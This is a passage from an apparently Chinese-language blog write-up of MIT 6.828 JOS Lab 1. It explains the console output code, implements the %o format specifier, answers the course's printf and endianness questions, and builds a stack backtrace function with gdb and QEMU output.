class="string">&quot;=a&quot;</span> (data) : <span class="string">&quot;d&quot;</span> (port))</span>;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inc/x86.h</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">outb</span><span class="params">(<span class="type">int</span> port, <span class="type">uint8_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;outb %0,%w1&quot;</span> : : <span class="string">&quot;a&quot;</span> (data), <span class="string">&quot;d&quot;</span> (port))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们可以知道其主要功能就是从 <code>Line Status Register</code> 中读取数据，若不为 <code>COM_LSR_TXRDY</code> 则重试（最多 12800次），否则说明 <code>Transmit buffer</code> 已就绪，之后便向 <code>Transmit buffer</code> 中写入我们要输出的字符</p><p>这里调用了一个 delay 函数，主要是由于历史遗留问题从而需要显式地从 0x84 端口中读取 4 次 1 字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Stupid I/O delay routine necessitated by historical PC design flaws</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">delay</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">    inb(<span class="number">0x84</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>serial_putc()</code> 的功能已经明了：检查对应端口状态，写入字符，接下来我们来看 <code>lpt_putc()</code>，还是从一个奇怪的端口读取数据并检查，之后向另外两个端口写入奇怪的数据，因为笔者不是硬件相关开发者所以这里就不深究了（笑）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***** Parallel port output code *****/</span></span><br><span class="line"><span class="comment">// For information on PC parallel port programming, see the class References</span></span><br><span class="line"><span class="comment">// page.</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">lpt_putc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; !(inb(<span class="number">0x378</span>+<span class="number">1</span>) &amp; <span class="number">0x80</span>) &amp;&amp; i &lt; <span class="number">12800</span>; i++)</span><br><span class="line">        delay();</span><br><span class="line">    outb(<span class="number">0x378</span>+<span class="number">0</span>, c);</span><br><span class="line">    outb(<span class="number">0x378</span>+<span class="number">2</span>, <span class="number">0x08</span>|<span class="number">0x04</span>|<span class="number">0x01</span>);</span><br><span class="line">    outb(<span class="number">0x378</span>+<span class="number">2</span>, <span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是 <code>cga_putc()</code>，这是实现字符规范化字符打印的<strong>核心函数</strong>：</p><ul><li><p>首先检查若未设置颜色参数则默认设置黑底白字</p></li><li><p>之后是对特殊字符的处理，对于普通字符则是直接写显存</p></li><li><p>在完成之后检查光标是否越界，若是则进行<strong>滚屏</strong>，这里实现的方法比较简单粗暴，直接移动整块内存后清空最后一行，将光标位置向前移动80字符（一行的宽度）</p></li><li><p>最后向显卡对应寄存器写入光标位置</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">cga_putc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// if no attribute given, then use black on white</span></span><br><span class="line">    <span class="keyword">if</span> (!(c &amp; ~<span class="number">0xFF</span>))</span><br><span class="line">        c |= <span class="number">0x0700</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (c &amp; <span class="number">0xff</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\b&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> (crt_pos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            crt_pos--;</span><br><span class="line">            crt_buf[crt_pos] = (c &amp; ~<span class="number">0xff</span>) | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        crt_pos += CRT_COLS;</span><br><span class="line">        <span class="comment">/* fallthru */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\r&#x27;</span>:</span><br><span class="line">        crt_pos -= (crt_pos % CRT_COLS);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\t&#x27;</span>:</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        cons_putc(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        crt_buf[crt_pos++] = c;        <span class="comment">/* write the character */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// What is the purpose of this?</span></span><br><span class="line">    <span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="type">uint16_t</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)</span><br><span class="line">            crt_buf[i] = <span class="number">0x0700</span> | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        crt_pos -= CRT_COLS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* move that little blinky thing */</span></span><br><span class="line">    outb(addr_6845, <span class="number">14</span>);</span><br><span class="line">    outb(addr_6845 + <span class="number">1</span>, crt_pos &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    outb(addr_6845, <span class="number">15</span>);</span><br><span class="line">    outb(addr_6845 + <span class="number">1</span>, crt_pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这个实现方法和笔者当时写实验性质 OS kernel 的时候倒是一样，不过令笔者不爽的是 xv6 将 <code>\t</code> 实现为别扭的 5 个空格（恼）</p></blockquote><p>这么一轮分析下来这个字符输出原语已经基本上分析得差不多了，剩下的一些高级的封装函数笔者就不深入分析贴在这里了，主要就是借助这个字符输出原语实现的一些 tricks，其中对于格式化字符串输出 xv6 实现为 <code>printfmt()</code> 函数，其核心为 <code>vprintfmt()</code> 函数，主要是用一个有穷自动状态机解析格式化字符串并从栈上读取参数输出。</p><p>接下来是 Exercise 8，补充格式化字符串打印中的 <code>%o</code> 参数的实现</p><blockquote><p>Exercise 8. We have omitted a small fragment of code - the code necessary to print octal numbers using patterns of the form “%o”. Find and fill in this code fragment.</p></blockquote><p>xv6 非常贴心地将数字输出实现为一个无前缀的多进制输出函数 <code>printnum()</code> ，参考 glibc 中 printf 的 8 进制输出是没有前缀的，我们只需要从栈上获取对应数值、设置 base后直接跳转调用即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (unsigned) octal</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">    <span class="comment">// Replace this with your code.</span></span><br><span class="line">    num = getuint(&amp;ap, lflag);</span><br><span class="line">    base = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">goto</span> number;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">number:</span><br><span class="line">    printnum(putch, putdat, num, base, width, padc);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>内核入口点是 <code>kern/entry.S</code>，之后会调用到 <code>kern/init.c</code> 中的 <code>i386_init()</code>，其中有一句调用了 %o 的输出语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cprintf(<span class="string">&quot;6828 decimal is %o octal!\n&quot;</span>, <span class="number">6828</span>);</span><br></pre></td></tr></table></figure><p>我们 make clean 之后重新 make 再 make qemu，查看效果，成功实现 %o 的输出功能：</p><p><img src="https://s2.loli.net/2022/03/15/T8WRyaDCi1blp9M.png" alt="image.png"></p><p>最后是 6.828 的一些练习题：</p><ol><li><p>Explain the interface between printf.c and console.c. Specifically, what function does console.c export? How is this function used by printf.c?</p><p><code>console.c</code> 提供了单个字符输出的函数 <code>cputchar()</code>，在 <code>printf.c</code> 中封装为 <code>putch()</code> 函数进行单个字符的输出</p></li><li><p>Explain the following from console.c:</p><p>1 if (crt_pos &gt;&#x3D; CRT_SIZE) {<br>2 int i;<br>3 memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * sizeof(uint16_t));<br>4 for (i &#x3D; CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>5 crt_buf[i] &#x3D; 0x0700 | ‘ ‘;<br>6 crt_pos -&#x3D; CRT_COLS;<br>7 }</p><p>这段代码的作用是<strong>在光标超出 80 x 24 显示区域时进行滚屏</strong>，主要原理就是将第一行往后的数据都向前移动一行，光标向前清空一行的显存为空格后向前移动一行（行宽 80 字符）</p></li><li><p>For the following questions you might wish to consult the notes for Lecture 2. These notes cover GCC’s calling convention on the x86.</p><p>Trace the execution of the following code step-by-step:</p><p>int x &#x3D; 1, y &#x3D; 3, z &#x3D; 4;<br>cprintf(“x %d, y %x, z %d\n”, x, y, z);</p><ul><li><p>In the call to <code>cprintf()</code>, to what does <code>fmt</code> point? To what does <code>ap</code> point?</p><p><del>二进制选手的送分题，</del>指向格式化字符串的指针与 x、y、z 三个参数都在栈上，<code>fmt</code> 指针指向存放格式化字符串的位置，这里应该是位于 .data 段上，<code>ap</code> 则指向栈上的参数 x</p></li><li><p>List (in order of execution) each call to <code>cons_putc</code>, <code>va_arg</code>, and <code>vcprintf</code>. For <code>cons_putc</code>, list its argument as well. For <code>va_arg</code>, list what <code>ap</code> points to before and after the call. For <code>vcprintf</code> list the values of its two arguments.</p><p><del>题目太长不看。</del> <code>cons_putc</code> 的参数为要输出的字符的数据，定义为一个 int 类型，实际上只用到了低 2 字节，第一个字节为 ASCII 码，第二个字节为显示的字符颜色与背景色；对于 <code>va_arg</code> 而言，<code>ap</code>指向栈上的某个位置，这个位置上应当存放着我们的可变长参数组中的某个参数，在调用后其会指向下一个参数；<code>vcprintf</code> 的两个参数一个是格式化字符串，另一个则是 <code>va_arg</code> 容器</p></li></ul></li><li><p>Run the following code.</p><p>unsigned int i &#x3D; 0x00646c72;<br>cprintf(“H%x Wo%s”, 57616, &amp;i);</p><p>What is the output? Explain how this output is arrived at in the step-by-step manner of the previous exercise. <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the x86 is little-endian. If the x86 were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p><p>将代码添加到 <code>init.c</code> 中，实测输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">He110 World</span><br></pre></td></tr></table></figure><p>57616 作为 16 进制输出为 e110，而 变量 i 的值被作为一个字符串解析（我们输入的参数为指向 i 的指针），因此输出 “rld”；如果是大端序的话前者不会有变化而后者因为直接碰到 “\0” 于是什么也不输出</p></li><li><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><p>cprintf(“x&#x3D;%d y&#x3D;%d”, 3);</p><p>y会是一个相对随机的值，有一定概率会是一个指向栈上的指针（old rbp），关键得看编译器生成的代码；这是因为我们在调用 cprintf 时在格式字符串中写有两个参数，但我们只传了一个参数，cprintf 会从栈上存放 3 的位置再往后读一个参数打印出来</p></li><li><p>Let’s say that GCC changed its calling convention so that it pushed arguments on the stack in declaration order, so that the last argument is pushed last. How would you have to change <code>cprintf</code> or its interface so that it would still be possible to pass it a variable number of arguments?</p><p>使用最后一个参数来指定参数的数量即可。</p></li></ol><p>最后还有个打印不同颜色的 Challenge，懒得做了</p><h3 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h3><p>这一节主要讲 x86 下 C 的函数运行时栈与调用约定，并编写一个能够打印堆栈 backtrace 的函数（类似于 Linux 内核 crash 以后打印错误的那种函数）</p><p>首先是 Exercise 9，找到内核栈初始化的代码、内核栈在内存中的位置，以及内核保留栈空间的方法与堆栈指针被初始化指向该空间的位置</p><blockquote><p>Exercise 9. Determine where the kernel initializes its stack, and exactly where in memory its stack is located. How does the kernel reserve space for its stack? And at which “end” of this reserved area is the stack pointer initialized to point to?</p></blockquote><p>在内核入口函数中在调用 <code>i386_init()</code> 之前有一段代码初始化了内核栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Clear the frame pointer register (EBP)</span><br><span class="line"># so that once we get into debugging C code,</span><br><span class="line"># stack backtraces will be terminated properly.</span><br><span class="line">movl    $0x0,%ebp            # nuke frame pointer</span><br><span class="line"></span><br><span class="line"># Set the stack pointer</span><br><span class="line">movl    $(bootstacktop),%esp</span><br><span class="line"></span><br><span class="line"># now to C code</span><br><span class="line">call    i386_init</span><br></pre></td></tr></table></figure><p>我们上手调试一下，结果如下，我们看到堆栈指针寄存器（esp）指向 <code>0xf0110000</code>，而栈帧指针寄存器（ebp）指向 0 地址，关于这两个寄存器之间的关系笔者不再赘叙，请各位读者自行复习 C 函数调用栈相关知识，可以看到这里我们的内核栈被初始化到内存高地址中一个固定的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">relocated () at kern/entry.S:74</span><br><span class="line">74        movl    $0x0,%ebp            # nuke frame pointer</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0xf0100034 &lt;relocated+5&gt;:    mov    $0xf0110000,%esp</span><br><span class="line">relocated () at kern/entry.S:77</span><br><span class="line">77        movl    $(bootstacktop),%esp</span><br><span class="line">(gdb) si</span><br><span class="line">=&gt; 0xf0100039 &lt;relocated+10&gt;:    call   0xf01000aa &lt;i386_init&gt;</span><br><span class="line">80        call    i386_init</span><br><span class="line">(gdb) info registers</span><br><span class="line">eax            0xf010002f          -267386833</span><br><span class="line">ecx            0x0                 0</span><br><span class="line">edx            0xffffff40          -192</span><br><span class="line">ebx            0x10094             65684</span><br><span class="line">esp            0xf0110000          0xf0110000 &lt;entry_pgtable&gt;</span><br><span class="line">ebp            0x0                 0x0</span><br><span class="line">esi            0x10094             65684</span><br><span class="line">edi            0x0                 0</span><br><span class="line">eip            0xf0100039          0xf0100039 &lt;relocated+10&gt;</span><br><span class="line">eflags         0x86                [ PF SF ]</span><br><span class="line">cs             0x8                 8</span><br><span class="line">ss             0x10                16</span><br><span class="line">ds             0x10                16</span><br><span class="line">es             0x10                16</span><br><span class="line">fs             0x10                16</span><br><span class="line">gs             0x10                16</span><br><span class="line">(gdb) </span><br></pre></td></tr></table></figure><p>6.828 文档中向我们揭示了栈回溯的原理：按照 C 函数调用栈的相关约定，ebp指针指向栈底，这个位置上存放了上一层调用的 ebp，再往后一个位置存放的是该函数的返回地址，即上层调用函数中调用了这个函数的指令的下一条指令的地址，因此利用 ebp 我们便可以回溯多层函数调用栈</p><p>下面看 Exercise 10，主要是让我们通过调试感知 C 函数调用栈</p><blockquote><p>Exercise 10. To become familiar with the C calling conventions on the x86, find the address of the <code>test_backtrace</code> function in obj&#x2F;kern&#x2F;kernel.asm, set a breakpoint there, and examine what happens each time it gets called after the kernel starts. How many 32-bit words does each recursive nesting level of <code>test_backtrace</code> push on the stack, and what are those words?</p><p>Note that, for this exercise to work properly, you should be using the patched version of QEMU available on the <a href="https://pdos.csail.mit.edu/6.828/2018/tools.html">tools</a> page or on Athena. Otherwise, you’ll have to manually translate all breakpoint and memory addresses to linear addresses.</p></blockquote><p>然后是 Exercise 11，让我们补全实现 <code>mon_backtrace()</code></p><blockquote><p>Exercise 11. Implement the backtrace function as specified above. Use the same format as in the example, since otherwise the grading script will be confused. When you think you have it working right, run make grade to see if its output conforms to what our grading script expects, and fix it if it doesn’t. <em>After</em> you have handed in your Lab 1 code, you are welcome to change the output format of the backtrace function any way you like.</p><p>If you use <code>read_ebp()</code>, note that GCC may generate “optimized” code that calls <code>read_ebp()</code> <em>before</em> <code>mon_backtrace()</code>‘s function prologue, which results in an incomplete stack trace (the stack frame of the most recent function call is missing). While we have tried to disable optimizations that cause this reordering, you may want to examine the assembly of <code>mon_backtrace()</code> and make sure the call to <code>read_ebp()</code> is happening after the function prologue.</p></blockquote><p>我们需要实现打印如下格式的栈回溯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Stack backtrace:</span><br><span class="line">  ebp f0109e58  eip f0100a62  args 00000001 f0109e80 f0109e98 f0100ed2 00000031</span><br><span class="line">  ebp f0109ed8  eip f01000d6  args 00000000 00000000 f0100058 f0109f28 00000061</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>在内核初始化时将 ebp 设为了0，这提供给我们一个很好的作为判断栈回溯终止的条件，最终的栈回溯函数代码如下，由于 6.828 说他们提供的 <code>read_ebp()</code> 函数可能会被编译器优化掉所以笔者自己写了内联汇编：</p><blockquote><p>AT &amp; T 语法，非常🥚疼</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_backtrace</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Your code here.</span></span><br><span class="line">    <span class="type">uint32_t</span> *old_ebp, last_eip;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;movl %%ebp, %0;&quot;</span> : <span class="string">&quot;=r&quot;</span> (old_ebp))</span>;</span><br><span class="line">    cprintf(<span class="string">&quot;Stack backtrace:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (old_ebp)</span><br><span class="line">    &#123;</span><br><span class="line">        last_eip = old_ebp[<span class="number">1</span>];</span><br><span class="line">        cprintf(<span class="string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, </span><br><span class="line">            old_ebp, last_eip, old_ebp[<span class="number">2</span>], old_ebp[<span class="number">3</span>], old_ebp[<span class="number">4</span>], old_ebp[<span class="number">5</span>], old_ebp[<span class="number">6</span>]);</span><br><span class="line">        old_ebp = (<span class="type">uint32_t</span> *) old_ebp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下，成功打印栈回溯：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">make qemu</span></span><br><span class="line">sed &quot;s/localhost:1234/localhost:26000/&quot; &lt; .gdbinit.tmpl &gt; .gdbinit</span><br><span class="line">qemu-system-i386 -drive file=obj/kern/kernel.img,index=0,media=disk,format=raw -serial mon:stdio -gdb tcp::26000 -D qemu.log </span><br><span class="line">6828 decimal is 15254 octal!</span><br><span class="line">entering test_backtrace 5</span><br><span class="line">entering test_backtrace 4</span><br><span class="line">entering test_backtrace 3</span><br><span class="line">entering test_backtrace 2</span><br><span class="line">entering test_backtrace 1</span><br><span class="line">entering test_backtrace 0</span><br><span class="line">Stack backtrace:</span><br><span class="line">  ebp f010ff18  eip f01000a5  args 00000000 00000000 00000000 f010004e f0111308</span><br><span class="line">  ebp f010ff38  eip f010007a  args 00000000 00000001 f010ff78 f010004e f0111308</span><br><span class="line">  ebp f010ff58  eip f010007a  args 00000001 00000002 f010ff98 f010004e f0111308</span><br><span class="line">  ebp f010ff78  eip f010007a  args 00000002 00000003 f010ffb8 f010004e f0111308</span><br><span class="line">  ebp f010ff98  eip f010007a  args 00000003 00000004 00000000 f010004e f0111308</span><br><span class="line">  ebp f010ffb8  eip f010007a  args 00000004 00000005 00000000 f010004e f0111308</span><br><span class="line">  ebp f010ffd8  eip f01000fc  args 00000005 00001aac 00000640 00000000 00000000</span><br><span class="line">  ebp f010fff8  eip f010003e  args 00000003 00001003 00002003 00003003 00004003</span><br><span class="line">leaving test_backtrace 0</span><br><span class="line">leaving test_backtrace 1</span><br><span class="line">//...</span><br></pre></td></tr></table></figure><p>最后是 lab 1 的最后一个练习——Exercise 12，要求我们打印栈回溯信息的同时打印函数名、函数位于的源文件及他们在源文件中的行号</p><blockquote><p>Exercise 12. Modify your stack backtrace function to display, for each eip, the function name, source file name, and line number corresponding to that eip.</p><p>In <code>debuginfo_eip</code>, where do _<em>STAB</em>* come from? This question has a long answer; to help you to discover the answer, here are some things you might want to do:</p><ul><li>look in the file kern&#x2F;kernel.ld for _<em>STAB</em>*</li><li>run objdump -h obj&#x2F;kern&#x2F;kernel</li><li>run objdump -G obj&#x2F;kern&#x2F;kernel</li><li>run gcc -pipe -nostdinc -O2 -fno-builtin -I. -MD -Wall -Wno-format -DJOS_KERNEL -gstabs -c -S kern&#x2F;init.c, and look at init.s.</li><li>see if the bootloader loads the symbol table in memory as part of loading the kernel binary</li></ul><p>Complete the implementation of <code>debuginfo_eip</code> by inserting the call to <code>stab_binsearch</code> to find the line number for an address.</p><p>Add a backtrace command to the kernel monitor, and extend your implementation of <code>mon_backtrace</code> to call <code>debuginfo_eip</code> and print a line for each stack frame of the form:</p><p>K&gt; backtrace<br>Stack backtrace:<br> ebp f010ff78 eip f01008ae args 00000001 f010ff8c 00000000 f0110580 00000000<br> kern&#x2F;monitor.c:143: monitor+106<br> ebp f010ffd8 eip f0100193 args 00000000 00001aac 00000660 00000000 00000000<br> kern&#x2F;init.c:49: i386_init+59<br> ebp f010fff8 eip f010003d args 00000000 00000000 0000ffff 10cf9a00 0000ffff<br> kern&#x2F;entry.S:70: +0<br>K&gt;</p><p>Each line gives the file name and line within that file of the stack frame’s eip, followed by the name of the function and the offset of the eip from the first instruction of the function (e.g., monitor+106 means the return eip is 106 bytes past the beginning of monitor).</p><p>Be sure to print the file and function names on a separate line, to avoid confusing the grading script.</p><p>Tip: printf format strings provide an easy, albeit obscure, way to print non-null-terminated strings like those in STABS tables. <code>printf(&quot;%.*s&quot;, length, string)</code> prints at most <code>length</code> characters of <code>string</code>. Take a look at the printf man page to find out why this works.</p><p>You may find that some functions are missing from the backtrace. For example, you will probably see a call to <code>monitor()</code> but not to <code>runcmd()</code>. This is because the compiler in-lines some function calls. Other optimizations may cause you to see unexpected line numbers. If you get rid of the -O2 from GNUMakefile, the backtraces may make more sense (but your kernel will run more slowly).</p></blockquote><p>我们如果要从头实现这个功能的话可能会有点麻烦，好在 JOS 为我们提供了一个可以实现该功能的库函数 <code>debuginfo_eip()</code>，直接拿来用就行</p><p>在拿来用之前我们需要注意其并未实现行号功能，我们还需要手动在 <code>kern/debug.c</code> 中补全实现，这一块原理比较复杂，主要靠其提供的 <code>stab_binsearch()</code> 函数实现，感兴趣的可以了解一下 stab：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Search within [lline, rline] for the line number stab.</span></span><br><span class="line"><span class="comment">// If found, set info-&gt;eip_line to the right line number.</span></span><br><span class="line"><span class="comment">// If not found, return -1.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//    There&#x27;s a particular stabs type used for line numbers.</span></span><br><span class="line"><span class="comment">//    Look at the STABS documentation and &lt;inc/stab.h&gt; to find</span></span><br><span class="line"><span class="comment">//    which one.</span></span><br><span class="line"><span class="comment">// Your code here.</span></span><br><span class="line">stab_binsearch(stabs, &amp;lfun, &amp;rfun, N_SLINE, addr - info-&gt;eip_fn_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lfun &lt;= rfun)</span><br><span class="line">&#123;</span><br><span class="line">    info-&gt;eip_line = stabs[lfun].n_desc;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 backtrace 中需要注意的是其提供的函数名指针并非以 <code>\0</code> 结尾所以我们还需要手动指定输出长度，最终 backtrace 